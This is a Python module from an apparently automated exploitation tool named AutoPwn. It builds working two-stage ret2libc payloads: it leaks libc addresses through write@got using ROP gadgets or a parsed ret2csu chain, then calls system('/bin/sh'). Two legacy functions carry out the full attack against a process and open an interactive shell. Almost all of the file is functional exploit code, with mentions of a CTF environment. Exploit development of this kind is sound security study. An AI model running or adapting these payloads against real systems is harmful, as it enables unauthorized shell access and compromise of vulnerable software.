"""AutoPwn primitives layer: 2-stage ret2libc-write payload builders (P6.4).

Replaces the v3.1 monolith's ``ret2libc_write_x32`` /
``ret2libc_write_x64`` (local) + ``ret2libc_write_x32_canary_*`` /
``ret2libc_write_x64_canary_*`` (canary — P7.10) payload
construction blocks (see ``autopwn/_legacy.py`` L896-1024 +
L1514-1588 + L2483-2640 area) with two typed
:class:`ExploitPrimitive` subclasses that **override
``stage_count()`` to 2**.

Per ``rebuild.md`` §6.7 P6.4 + ``refactor.md`` §3.2.2, this is
the second 2-stage primitive in the P6 layer.  It demonstrates
the variant of the P6.3 pattern that uses ``write(1, got, n)``
to leak a libc address instead of ``puts(got)`` — useful when
``puts`` is not in PLT (e.g. level3_x64).

Public API
----------
* :class:`Ret2LibcWriteX32` — 32-bit 2-stage primitive.
  * ``build_payload(ctx)`` → stage 1 leak payload
    (``padding + write_plt + main + 1 + write_got + 4``)
  * ``build_stage2_payload(ctx, leaked_write_addr)`` → stage 2
    final payload (``padding + system + 0 + sh``)
  * ``stage_count()`` → 2
* :class:`Ret2LibcWriteX64` — 64-bit 2-stage primitive.
  Same API; stage 1 uses ``pop_rdi + pop_rsi`` gadget chain,
  stage 2 includes the ``ret`` alignment gadget (P6.2 fix —
  a bug fix vs v3.1's x64 write which lacked alignment).

Why write() vs puts() in stage 1
--------------------------------
* ``puts(got)`` leaks a single byte less (no trailing NUL but
  stops at the first ``\\0``) and is a libc-agnostic leak
  (works for any libc).
* ``write(1, got, n)`` leaks exactly ``n`` bytes raw, no
  NUL-termination, but requires the binary to import
  ``write`` (vs ``puts``).

P6.3 is the ``puts``-based primitive; P6.4 is the
``write``-based one.  Both have the same 2-stage contract.

Design notes
------------
* x32 stage 1: ``write(fd=1, buf=write_got, count=4)`` — leaks
  4 bytes (one libc address).  The 4 is a 32-bit word size;
  for x64 the count would be 8 (but x64 doesn't need this
  primitive because puts works fine there).
* x64 stage 1 uses two gadget pops: ``pop rdi; ret`` for
  ``fd=1``, then ``pop rsi; ret`` for ``buf=write_got``.
  v3.1 has 3 conditional branches for `other_rdi_registers` /
  `other_rsi_registers` (when the gadget pops extra registers);
  the new public function takes the simple case
  (``other_rdi == 0 and other_rsi == 0``) — the conditional
  variants are preserved in the legacy port for spec parity.
* Stage 2 shape is **identical** to :class:`Ret2LibcPutX32`/
  :class:`Ret2LibcPutX64`: ``padding + system + 0 + sh`` (x32)
  or ``padding + pop_rdi + sh + ret + system`` (x64).  The
  new public function uses the same shape as P6.3 for
  consistency.
* v3.1's x64 ret2libc_write **lacked** the ``ret`` alignment
  gadget in stage 2 (a v3.1 inconsistency vs. the P6.2
  ret2system which has it).  The new public function adds
  the ``ret`` gadget to fix Ubuntu 18.04+ glibc MOVAPS —
  the legacy port preserves the v3.1 shape (no ``ret``) for
  spec parity.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from functools import lru_cache
from pathlib import Path
from typing import Optional, Tuple

from autopwn.context import ExploitContext
from autopwn.core.runner import run_objdump_disasm
from autopwn.primitives.base import ExploitPrimitive


_OBJDUMP_INSN_RE = re.compile(r"^\s*([0-9a-fA-F]+):\s+([a-z].*?)\s*$")
_INTEL_MOV_RE = re.compile(r"^mov\s+([a-z0-9]+)\s*,\s*([a-z0-9]+)$")
_INTEL_POP_RE = re.compile(r"^pop\s+([a-z0-9]+)$")
_INTEL_ADD_RSP_RE = re.compile(r"^add\s+rsp\s*,\s*(0x[0-9a-f]+|\d+)$")
_INTEL_CALL_PTR_RE = re.compile(r"^call\s+(?:qword ptr\s+)?\[(r[a-z0-9]+)\+rbx\*8\]$")
_X64_CSU_ARG_REGS = {"rdi", "rsi", "rdx"}
_X64_REG_ALIASES = {
    "edi": "rdi",
    "esi": "rsi",
    "edx": "rdx",
    "ebx": "rbx",
    "ebp": "rbp",
    "r12d": "r12",
    "r13d": "r13",
    "r14d": "r14",
    "r15d": "r15",
}


@dataclass(frozen=True)
class _X64PopGadget:
    """A ``pop rdx; ...; ret`` gadget plus its trailing pop count."""

    addr: int
    extra_pop_count: int = 0


@dataclass(frozen=True)
class _X64Ret2CSUPlan:
    """Parsed ``__libc_csu_init`` recipe for a 3-argument indirect call."""

    pop_gadget: int
    call_gadget: int
    pop_order: tuple[str, ...]
    arg_reg_map: tuple[tuple[str, str], ...]
    call_reg: str
    stack_skip_qwords: int = 1


def _normalize_x64_reg(name: str) -> str:
    """Normalize 32-bit register spellings (``edi``) to 64-bit form (``rdi``)."""
    reg = name.strip().lower().lstrip("%")
    return _X64_REG_ALIASES.get(reg, reg)


def _pack_x64_chain(padding: int, *words: int) -> bytes:
    """Return ``padding`` bytes of NOPs followed by ``p64``-packed words."""
    from pwn import asm, p64

    return asm("nop") * padding + b"".join(p64(word) for word in words)


@lru_cache(maxsize=None)
def _find_x64_pop_rdx_gadget(program_str: str) -> Optional[_X64PopGadget]:
    """Find the shortest usable ``pop rdx; ...; ret`` gadget in ``program``."""
    from pwn import ELF, ROP

    try:
        elf = ELF(program_str, checksec=False)
        rop = ROP(elf)
    except Exception:
        return None

    candidates = []
    for addr, gadget in rop.gadgets.items():
        insns = tuple(str(insn).strip().lower() for insn in gadget.insns)
        if len(insns) < 2 or insns[0] != "pop rdx" or insns[-1] != "ret":
            continue
        middle = insns[1:-1]
        if not all(insn.startswith("pop ") for insn in middle):
            continue
        candidates.append(_X64PopGadget(addr=addr, extra_pop_count=len(middle)))

    if not candidates:
        return None
    return min(candidates, key=lambda g: (g.extra_pop_count, g.addr))


@lru_cache(maxsize=None)
def _parse_intel_objdump_function(program_str: str, func_name: str) -> tuple[tuple[int, str], ...]:
    """Extract ``(addr, instruction)`` tuples for ``func_name`` from objdump output."""
    content = run_objdump_disasm(Path(program_str), intel=True)
    marker = f"<{func_name}>:"
    in_func = False
    instructions = []

    for raw_line in content.splitlines():
        line = raw_line.rstrip()
        if not in_func:
            if marker in line:
                in_func = True
            continue
        if not line.strip():
            break
        match = _OBJDUMP_INSN_RE.match(line)
        if not match:
            if "<" in line and ">:" in line:
                break
            continue
        addr, insn = match.groups()
        instructions.append((int(addr, 16), insn.strip().lower()))

    return tuple(instructions)


@lru_cache(maxsize=None)
def _find_x64_ret2csu_plan(program_str: str) -> Optional[_X64Ret2CSUPlan]:
    """Parse ``__libc_csu_init`` into a fail-closed ret2csu plan."""
    instructions = _parse_intel_objdump_function(program_str, "__libc_csu_init")
    if not instructions:
        return None

    call_index = None
    call_reg = None
    for index, (_, insn) in enumerate(instructions):
        call_match = _INTEL_CALL_PTR_RE.match(insn)
        if call_match:
            call_index = index
            call_reg = _normalize_x64_reg(call_match.group(1))
            break
    if call_index is None or call_reg is None:
        return None

    arg_reg_map: dict[str, str] = {}
    first_move_index = call_index
    cursor = call_index - 1
    while cursor >= 0:
        move_match = _INTEL_MOV_RE.match(instructions[cursor][1])
        if not move_match:
            break
        dst = _normalize_x64_reg(move_match.group(1))
        src = _normalize_x64_reg(move_match.group(2))
        if dst not in _X64_CSU_ARG_REGS:
            break
        arg_reg_map[dst] = src
        first_move_index = cursor
        cursor -= 1
    if set(arg_reg_map) != _X64_CSU_ARG_REGS:
        return None

    for index in range(call_index + 1, len(instructions)):
        add_match = _INTEL_ADD_RSP_RE.match(instructions[index][1])
        if not add_match:
            continue
        stack_skip = int(add_match.group(1), 0)
        if stack_skip % 8 != 0:
            continue

        pop_order = []
        pop_index = index + 1
        while pop_index < len(instructions):
            pop_match = _INTEL_POP_RE.match(instructions[pop_index][1])
            if not pop_match:
                break
            pop_order.append(_normalize_x64_reg(pop_match.group(1)))
            pop_index += 1

        if not pop_order or pop_index >= len(instructions):
            continue
        if instructions[pop_index][1] != "ret":
            continue

        required = {"rbx", "rbp", call_reg, *arg_reg_map.values()}
        if not required.issubset(set(pop_order)):
            return None

        return _X64Ret2CSUPlan(
            pop_gadget=instructions[index + 1][0],
            call_gadget=instructions[first_move_index][0],
            pop_order=tuple(pop_order),
            arg_reg_map=tuple(sorted(arg_reg_map.items())),
            call_reg=call_reg,
            stack_skip_qwords=stack_skip // 8,
        )

    return None


def _build_x64_write_stage1_direct(
    ctx: ExploitContext,
    write_plt: Optional[int],
    write_got: Optional[int],
    main_addr: Optional[int],
) -> bytes:
    """Build ``write(1, write@got, 8)`` via direct pop gadgets, including ``rdx``."""
    if (
        ctx.gadgets_x64 is None
        or ctx.gadgets_x64.pop_rdi == 0
        or ctx.gadgets_x64.pop_rsi == 0
        or write_plt is None
        or write_got is None
        or main_addr is None
    ):
        return b""

    rdx_gadget = _find_x64_pop_rdx_gadget(str(ctx.binary.path))
    if rdx_gadget is None:
        return b""

    g = ctx.gadgets_x64
    chain = [
        g.pop_rdi, 1,
        *([0] * max(0, g.extra_rdi)),
        g.pop_rsi, write_got,
        *([0] * max(0, g.extra_rsi)),
        rdx_gadget.addr, 8,
        *([0] * rdx_gadget.extra_pop_count),
        write_plt, main_addr,
    ]
    return _pack_x64_chain(ctx.padding, *chain)


def _build_x64_write_stage1_ret2csu(
    ctx: ExploitContext,
    write_got: Optional[int],
    main_addr: Optional[int],
) -> bytes:
    """Build ``write(1, write@got, 8)`` via parsed ``__libc_csu_init``."""
    if write_got is None or main_addr is None:
        return b""

    plan = _find_x64_ret2csu_plan(str(ctx.binary.path))
    if plan is None:
        return b""

    arg_reg_map = dict(plan.arg_reg_map)
    register_values: dict[str, int] = {
        "rbx": 0,
        "rbp": 1,
    }

    def assign(reg: str, value: int) -> bool:
        existing = register_values.get(reg)
        if existing is not None and existing != value:
            return False
        register_values[reg] = value
        return True

    if not assign(plan.call_reg, write_got):
        return b""
    if not assign(arg_reg_map["rdi"], 1):
        return b""
    if not assign(arg_reg_map["rsi"], write_got):
        return b""
    if not assign(arg_reg_map["rdx"], 8):
        return b""

    initial_pop_values = [register_values.get(reg, 0) for reg in plan.pop_order]
    unwind_values = [0] * len(plan.pop_order)
    chain = [
        plan.pop_gadget,
        *initial_pop_values,
        plan.call_gadget,
        *([0] * max(0, plan.stack_skip_qwords)),
        *unwind_values,
        main_addr,
    ]
    return _pack_x64_chain(ctx.padding, *chain)


def _lookup_write_and_main(program: Path) -> Tuple[Optional[int], Optional[int], Optional[int]]:
    """Look up ``write@plt``, ``write@got``, and ``main`` from the binary.

    Returns:
        ``(write_plt, write_got, main_addr)`` — any may be ``None``
        when the symbol / GOT entry is absent.  The primitive
        treats ``None`` as "not applicable" and returns ``b""``.

    Side effects:
        Read-only ELF open via pwntools.  No writes, no globals
        writes, no process spawns.
    """
    from pwn import ELF

    try:
        e = ELF(str(program), checksec=False)
    except Exception:
        return None, None, None
    try:
        write_plt = e.plt["write"]
    except (KeyError, AttributeError):
        write_plt = None
    try:
        write_got = e.got["write"]
    except (KeyError, AttributeError):
        write_got = None
    try:
        main_addr = e.symbols["main"]
    except (KeyError, AttributeError):
        main_addr = None
    return write_plt, write_got, main_addr


def _resolve_libc_elf(ctx: ExploitContext):
    """Return the pwntools ``ELF`` for ``ctx.libc`` (lazy-open if needed).

    Duplicated from ``ret2libc_put.py`` (P6.3) per the project
    convention that each P6 module is self-contained (no
    cross-module imports within primitives/).  Returns
    ``None`` when ``ctx.libc.path`` is unset and
    ``ctx.libc.elf`` is also ``None``.
    """
    if ctx.libc.elf is not None:
        return ctx.libc.elf
    if ctx.libc.path is None:
        return None
    from pwn import ELF
    return ELF(str(ctx.libc.path), checksec=False)


class Ret2LibcWriteX32(ExploitPrimitive):
    """32-bit 2-stage ``ret2libc`` payload builder (leak via ``write``).

    Stage 1 (leak) payload shape::

        [A * padding] [p32(write_plt)] [p32(main)] [p32(1)] [p32(write_got)] [p32(4)]

    Stage 2 (return-to-system) payload shape::

        [A * padding] [p32(system)] [p32(0)] [p32(sh)]

    Requires:
        * ``ctx.binary.path`` is a 32-bit ELF with ``write@plt``,
          ``write@got``, and ``main`` symbols.
        * ``ctx.padding`` is the offset to the saved return
          address (P5.1).
        * ``ctx.libc.elf`` or ``ctx.libc.path`` is set (P4.2)
          before stage 2.
    """

    name = "ret2libc-write-x32"

    def stage_count(self) -> int:
        return 2

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Build the stage-1 leak payload (``write(1, write@GOT, 4)``)."""
        from pwn import asm, p32

        write_plt, write_got, main_addr = _lookup_write_and_main(ctx.binary.path)
        if write_plt is None or write_got is None or main_addr is None:
            return b""

        return (
            asm("nop") * ctx.padding
            + p32(write_plt)
            + p32(main_addr)  # return to main() for stage 2
            + p32(1)          # fd = stdout
            + p32(write_got)  # buf = write@got address
            + p32(4)          # count = 4 bytes (32-bit address)
        )

    def build_stage2_payload(
        self, ctx: ExploitContext, leaked_write_addr: int,
    ) -> bytes:
        """Build the stage-2 final payload (``system('/bin/sh')``).

        Args:
            ctx: the run's :class:`ExploitContext`.  Reads
                ``ctx.binary.path`` and ``ctx.libc.elf`` (or
                ``ctx.libc.path``).
            leaked_write_addr: the runtime address of ``write``
                in libc, parsed from the stage-1 response.

        Returns:
            The stage-2 payload bytes, or ``b""`` when libc
            resolution fails.
        """
        from pwn import asm, p32

        libc = _resolve_libc_elf(ctx)
        if libc is None:
            return b""

        try:
            libc_write = libc.symbols["write"]
            libc_base = leaked_write_addr - libc_write
            system_addr = libc_base + libc.symbols["system"]
            sh_addr = libc_base + next(libc.search(b"/bin/sh"))
        except (KeyError, AttributeError, StopIteration):
            return b""

        return (
            asm("nop") * ctx.padding
            + p32(system_addr)
            + p32(0)
            + p32(sh_addr)
        )


class Ret2LibcWriteX64(ExploitPrimitive):
    """64-bit 2-stage ``ret2libc`` payload builder (leak via ``write``).

    Stage 1 payload shape::

        [A * padding] [p64(pop_rdi)] [p64(1)] [p64(pop_rsi)] [p64(write_got)] [p64(write_plt)] [p64(main)]

    Stage 2 payload shape::

        [A * padding] [p64(pop_rdi)] [p64(sh)] [p64(ret)] [p64(system)]

    Requires:
        * Same as :class:`Ret2LibcWriteX32`, but 64-bit.
        * ``ctx.gadgets_x64.pop_rdi``, ``pop_rsi``, and
          ``ret`` are non-zero (P4.4).

    The extra ``ret`` gadget between ``sh`` and ``system``
    fixes the 16-byte RSP alignment required by Ubuntu 18.04+
    glibc (P6.2 §64-bit alignment).  v3.1's x64 ret2libc_write
    **lacked** this gadget; we add it for consistency with
    P6.2 / P6.3.
    """

    name = "ret2libc-write-x64"

    def stage_count(self) -> int:
        return 2

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Build the stage-1 leak payload (``write(1, write@GOT, 8)``).

        v4.1.15 reclassifies the old ``level3_x64`` failure as a
        generic x64 3-argument leak bug: the historic chain controlled
        only ``rdi/rsi`` and left ``rdx`` to runtime residue.  The
        repaired builder now prefers a direct ``pop rdx; ...; ret``
        gadget and otherwise falls back to a parsed ``__libc_csu_init``
        chain.  If neither path exists, it returns ``b""``.
        """
        write_plt, write_got, main_addr = _lookup_write_and_main(ctx.binary.path)
        if write_got is None or main_addr is None:
            return b""

        payload = _build_x64_write_stage1_direct(ctx, write_plt, write_got, main_addr)
        if payload:
            return payload
        return _build_x64_write_stage1_ret2csu(ctx, write_got, main_addr)

    def build_stage2_payload(
        self, ctx: ExploitContext, leaked_write_addr: int,
    ) -> bytes:
        """Build the stage-2 final payload (``system('/bin/sh')``).

        Mirrors v3.1 ``_legacy.ret2libc_write_x64`` L983-996 2-variant
        cascade (P6.4b fix, B-007).  The stage-2 pop chain is also
        affected by ``extra_rdi`` because the stage-2 ret uses
        ``pop rdi; sh; ret; system`` — when ``pop rdi; pop <reg>; ret``,
        v3.1 inserts a 0 placeholder to consume the extra slot.

        v4.0.5 (P6.4c fix, B-007 extension): the stack-alignment
        ``ret`` gadget is no longer hard-coded.  It is included
        iff ``ctx.frame_context.required_ret_count == 1``
        (computed by ``recon.frame.compute_required_ret_count`` from
        the caller's ``lea_offset`` — see ``fix.md`` §3.1).  This
        **replaces** the v4.0.2b magic-number heuristic
        ``include_ret = (padding < 32)`` with a principled decision
        based on real ABI arithmetic.  When ``ctx.frame_context`` is
        ``None`` (defensive — orchestrator always populates it now),
        defaults to including ``ret`` to preserve the v4.0.1
        always-align behaviour.
        """
        from pwn import asm, flat, p64

        if (
            ctx.gadgets_x64 is None
            or ctx.gadgets_x64.pop_rdi == 0
            or ctx.gadgets_x64.ret == 0
        ):
            return b""

        libc = _resolve_libc_elf(ctx)
        if libc is None:
            return b""

        try:
            libc_write = libc.symbols["write"]
            libc_base = leaked_write_addr - libc_write
            system_addr = libc_base + libc.symbols["system"]
            sh_addr = libc_base + next(libc.search(b"/bin/sh"))
        except (KeyError, AttributeError, StopIteration):
            return b""

        # v4.1.15: x64 write-leak is a 2-stage primitive that returns to
        # main() before re-entering the vulnerable path.  In the current
        # ctf_env runtime (2026-08-30), relying on a raw
        # frame_context.required_ret_count == 0 leaves stage 2 crashing
        # before shell verification.  Keep the frame-derived count, but
        # clamp it to a conservative minimum of 1 ret for this primitive.
        g = ctx.gadgets_x64
        required_ret_count = (
            ctx.frame_context.required_ret_count
            if ctx.frame_context is not None
            else 1
        )
        ret_gadget = p64(g.ret) * max(1, required_ret_count)

        if g.extra_rdi == 1:
            # v3.1 L983-996: extra_rdi=1 → 0 placeholder between sh and ret
            # to consume the extra ``pop <reg>`` slot.  The 0 here is
            # **independent** of the alignment ``ret`` — it stays in
            # both branches.  ``ret_gadget`` is conditionally appended.
            return flat(
                asm("nop") * ctx.padding
                + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
                + ret_gadget
                + p64(system_addr)
            )
        # both extra == 0 OR extra_rsi=1 (stage 2 doesn't use pop_rsi)
        return flat(
            asm("nop") * ctx.padding
            + p64(g.pop_rdi) + p64(sh_addr)
            + ret_gadget
            + p64(system_addr)
        )


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's full IO flow
# =====================================================================

def _legacy_ret2libc_write_x32(program, libc, padding, libc_path) -> bool:
    """[OBSOLETE — prefer :class:`Ret2LibcWriteX32`] Verbatim port of v3.1's ``ret2libc_write_x32``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3257).
    Preserves the full v3.1 IO flow: ``io = process(program)`` +
    ``ELF(program)`` + ``ELF(libc)`` (or ``LibcSearcher``) +
    payload1 send + ``io.recv(4)`` leak parse + libc arithmetic
    + payload2 send + ``handle_exploitation_success`` +
    ``io.interactive()``.

    Note: v3.1 L1577-1580 mistakenly labels this
    ``'ret2libc (puts) - x64 Remote'`` in the
    ``handle_exploitation_success`` call (copy-paste bug from
    puts) — preserved verbatim for spec parity.

    Returns:
        ``True`` on success, ``False`` on failure.
    """
    from pwn import ELF, asm, p32, process, u32, LibcSearcher

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_success, print_critical,
    )

    print_section_header("EXPLOITATION: ret2libc (write) - x32")
    print_payload("preparing ret2libc exploit using write function")

    io = process(str(program))
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)

    e = ELF(str(program))
    main_addr = e.symbols["main"]
    write_plt = e.symbols["write"]
    write_got = e.got["write"]

    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")

    print_payload("stage 1: leaking write address from GOT")
    payload1 = (
        asm("nop") * padding
        + p32(write_plt)
        + p32(main_addr)
        + p32(1)
        + p32(write_got)
        + p32(4)
    )
    io.recv()
    io.sendline(payload1)

    try:
        write_addr = u32(io.recv(4))
    except Exception:
        return False
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")

    if libc == 1 or not hasattr(libc, "symbols"):
        libc_searcher = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc_searcher.dump("write")
        system_addr = libcbase + libc_searcher.dump("system")
        sh_addr = libcbase + libc_searcher.dump("str_bin_sh")
    else:
        libc_write = libc.symbols["write"]
        system_addr = write_addr - libc_write + libc.symbols["system"]
        sh_addr = write_addr - libc_write + next(libc.search(b"/bin/sh"))

    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

    print_payload("stage 2: executing system('/bin/sh')")
    payload2 = asm("nop") * padding + p32(system_addr) + p32(0) + p32(sh_addr)
    io.recv()
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()
    return True


def _legacy_ret2libc_write_x64(
    program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr,
    other_rdi_registers, other_rsi_registers, libc_path,
) -> bool:
    """[OBSOLETE — prefer :class:`Ret2LibcWriteX64`] Verbatim port of v3.1's ``ret2libc_write_x64``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3263).
    Preserves the v3.1 IO flow including the 3-branch
    ``other_rdi_registers`` / ``other_rsi_registers`` conditional
    payload shape for stage 1 (the new public function takes
    the simple case only).  v3.1's stage 2 **lacks** the
    ``ret`` alignment gadget — preserved for spec parity.

    Returns:
        ``True`` on success, ``False`` on failure.
    """
    from pwn import ELF, asm, flat, p64, process, u64, LibcSearcher

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_success, print_critical,
    )

    print_section_header("EXPLOITATION: ret2libc (write) - x64")
    print_payload("preparing ret2libc exploit using write function")

    io = process(str(program))
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher for libc resolution")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)

    e = ELF(str(program))
    main_addr = e.symbols["main"]
    write_plt = e.symbols["write"]
    write_got = e.got["write"]

    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")

    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rsi_addr = int(pop_rsi_addr, 16)
    ret_addr = int(ret_addr, 16)

    print_payload("stage 1: leaking write address from GOT")
    if other_rsi_registers == 1:
        payload1 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(1),
             p64(pop_rsi_addr), p64(write_got), p64(0),
             p64(write_plt), p64(main_addr)]
        )
    elif other_rdi_registers == 1:
        payload1 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(1), p64(0),
             p64(pop_rsi_addr), p64(write_got),
             p64(write_plt), p64(main_addr)]
        )
    else:
        payload1 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(1),
             p64(pop_rsi_addr), p64(write_got),
             p64(write_plt), p64(main_addr)]
        )

    io.recv()
    io.sendline(payload1)

    try:
        write_addr = u64(io.recv(8))
    except Exception:
        return False
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")

    if libc == 1 or not hasattr(libc, "symbols"):
        libc_searcher = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc_searcher.dump("write")
        system_addr = libcbase + libc_searcher.dump("system")
        sh_addr = libcbase + libc_searcher.dump("str_bin_sh")
    else:
        libc_write = libc.symbols["write"]
        system_addr = write_addr - libc_write + libc.symbols["system"]
        sh_addr = write_addr - libc_write + next(libc.search(b"/bin/sh"))

    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

    print_payload("stage 2: executing system('/bin/sh')")
    if other_rdi_registers == 1:
        payload2 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(sh_addr),
             p64(0), p64(system_addr), p64(0)]
        )
    else:
        payload2 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(sh_addr),
             p64(system_addr), p64(0)]
        )

    io.recv()
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()
    return True


__all__ = [
    "Ret2LibcWriteX32",
    "Ret2LibcWriteX64",
    "_legacy_ret2libc_write_x32",
    "_legacy_ret2libc_write_x64",
]
